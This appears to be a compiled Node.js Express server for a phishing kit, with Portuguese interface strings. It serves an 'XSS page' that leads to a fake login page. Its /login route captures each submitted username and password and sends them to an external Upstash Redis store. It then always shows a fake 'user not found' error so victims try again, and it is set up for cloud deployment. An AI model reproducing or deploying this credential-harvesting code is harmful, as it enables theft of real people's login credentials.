"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const path_1 = __importDefault(require("path"));
const fs_1 = __importDefault(require("fs"));
const child_process_1 = require("child_process");
const dotenv_1 = __importDefault(require("dotenv"));
dotenv_1.default.config();
const app = (0, express_1.default)();
const tentativas = 5;
const PORT = process.env.PORT ? Number(process.env.PORT) : 3000;
const IS_PROD = process.env.NODE_ENV === 'production';
// Resolve public dir from project root (works in dev and Docker)
const publicDir = path_1.default.resolve(process.cwd(), 'public');
// Optional assets dir (if you have one)
const assetsDir = path_1.default.resolve(process.cwd(), 'assets');
const openBrowser = (url) => {
    const start = process.platform === 'darwin'
        ? 'open'
        : process.platform === 'win32'
            ? 'start'
            : 'xdg-open';
    (0, child_process_1.exec)(`${start} ${url}`);
};
// Body parsers
app.use(express_1.default.urlencoded({ extended: true }));
app.use(express_1.default.json());
// Static assets (optional)
app.use('/assets', express_1.default.static(assetsDir));
// Save with Upstash REST HSET using field/value pairs in the URL
const saveCredentialsToUpstash = (usuario, senha) => __awaiter(void 0, void 0, void 0, function* () {
    const loginData = {
        usuario,
        senha,
        timestamp: new Date().toISOString(),
    };
    const baseUrl = process.env.UPSTASH_REDIS_REST_URL;
    const token = process.env.UPSTASH_REDIS_REST_TOKEN;
    if (!baseUrl || !token) {
        console.error('Upstash credentials missing. Set UPSTASH_REDIS_REST_URL and UPSTASH_REDIS_REST_TOKEN.');
        return;
    }
    const key = `user:${usuario}`;
    try {
        const url = `${baseUrl}/hset/${encodeURIComponent(key)}/usuario/${encodeURIComponent(usuario)}/senha/${encodeURIComponent(senha)}/timestamp/${encodeURIComponent(loginData.timestamp)}`;
        const response = yield fetch(url, {
            method: 'POST',
            headers: { Authorization: `Bearer ${token}` },
        });
        if (response.ok) {
            console.log(`💾 Credentials saved to Upstash Redis for user: ${usuario}`);
        }
        else {
            const text = yield response.text();
            console.error('Failed to save credentials to Upstash Redis:', text);
        }
    }
    catch (error) {
        console.error('Error saving credentials to Upstash:', error);
    }
});
// Route for the XSS page (initial page)
app.get('/', (_req, res) => {
    try {
        const htmlTemplate = fs_1.default.readFileSync(path_1.default.join(publicDir, 'xss_page.html'), 'utf8');
        let htmlWithData = htmlTemplate.replace('{{tentativas}}', tentativas.toString());
        htmlWithData = htmlWithData.replace('{{error_message}}', '');
        res.send(htmlWithData);
    }
    catch (error) {
        console.error('Error reading XSS HTML template:', error);
        res.status(500).send('Internal Server Error');
    }
});
// Route for the fake page (redirected from XSS page)
app.get('/fake_page.html', (req, res) => {
    try {
        const htmlTemplate = fs_1.default.readFileSync(path_1.default.join(publicDir, 'fake_page.html'), 'utf8');
        let htmlWithData = htmlTemplate.replace('{{tentativas}}', tentativas.toString());
        const showError = req.query.error === 'invalid';
        htmlWithData = htmlWithData.replace('{{error_message}}', showError
            ? '<div style="color: red; font-size: 14px; margin-top: 10px;">• Usuário não encontrado</div>'
            : '');
        res.send(htmlWithData);
    }
    catch (error) {
        console.error('Error reading fake page HTML template:', error);
        res.status(500).send('Internal Server Error');
    }
});
// Login capture -> save to Upstash -> redirect with error
app.post('/login', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    const { usuario, senha } = req.body;
    if (!usuario || !senha) {
        res.redirect('/fake_page.html?error=invalid');
        return;
    }
    yield saveCredentialsToUpstash(usuario, senha);
    console.log(`Login attempt saved: ${usuario}`);
    res.redirect('/fake_page.html?error=invalid');
}));
// Serve any other static files from /public
app.use(express_1.default.static(publicDir));
app.listen(PORT, () => {
    const url = IS_PROD ? `https://your-app-name.onrender.com` : `http://localhost:${PORT}`;
    console.log(`🚀 Servidor rodando em ${url}`);
    if (!IS_PROD) {
        try {
            openBrowser(url);
        }
        catch (_a) {
            // no-op
        }
    }
    console.log('Iniciando com XSS page, que redirecionará para fake page e depois para link externo...');
});
